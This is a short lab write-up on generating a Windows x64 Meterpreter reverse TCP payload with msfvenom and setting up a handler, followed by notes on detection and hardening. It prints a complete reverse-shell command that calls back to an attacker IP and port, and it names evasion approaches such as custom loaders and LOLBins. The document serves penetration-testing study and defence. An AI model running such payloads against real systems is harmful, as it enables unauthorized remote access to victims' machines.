
# Lab Project: Windows x64 Reverse Shell Analysis
**Field:** Offensive Security / Penetration Testing

## Executive Summary
This laboratory project demonstrates the creation, execution, and analysis of a 64-bit Windows PowerShell reverse TCP payload using the Metasploit Framework (`msfvenom`). The objective is to evaluate how automated payloads interact with target operating systems and document both offensive execution and defensive mitigations.

## Lab Environment & Topology
* **Attacker Machine:** Kali Linux (IP: 192.168.1.17)
* **Target Machine:** Windows 10/11 Home Lab Environment

## Offensive Execution

### 1. Payload Generation
The following command was used to generate a PowerShell-compatible command-line payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f psh-cmd
```

**Flag Breakdown:**
* `-p windows/x64/meterpreter/reverse_tcp`: Specifies a 64-bit Windows Meterpreter reverse TCP payload.
* `LHOST=192.168.1.17`: The local IP address of the listening Kali Linux machine.
* `LPORT=4444`: The local port the attacker machine opens to listen for the incoming connection.
* `-f psh-cmd`: Formats the output as a clean, single-line PowerShell command line.

### 2. Handler Setup
On the Kali Linux machine, `msfconsole` was configured to listen for the incoming connection using the `multi/handler` module matching the payload settings.

---

## Defensive Insights & Mitigation

### 1. Modern Endpoint Detection Behavior
In a fully updated production environment, running a raw `msfvenom` generated command line is stopped by standard defenses:
* **Windows Defender Antivirus:** Blocks the execution based on known static signatures of the default Metasploit shellcode.
* **AMSI (Antimalware Scan Interface):** Scans the PowerShell buffer in memory before execution, catching the script block even if obfuscated.

### 2. Industry Alternatives for Testing
To simulate advanced threats where default payloads are easily caught, professional red teams evaluate alternative approaches:
* **C2 Frameworks:** Using modern Command and Control frameworks like *Sliver* or *Havoc* which utilize advanced process injection techniques.
* **Custom Loaders:** Writing custom wrappers in compiled languages like C++ or Nim to execute raw shellcode directly in memory via system APIs.
* **LOLBins:** Leveraging "Living off the Land Binaries" (like `msiexec`) to proxy execution through trusted system files.

### 3. Hardening Recommendations
To defend against PowerShell-based reverse shells, organizations should implement:
* **Constrained Language Mode (CLM):** Restricts dangerous PowerShell operations and API calls.
* **Script Block Logging:** Enable Windows Event ID 4104 to capture the full text of executed PowerShell scripts for security monitoring.
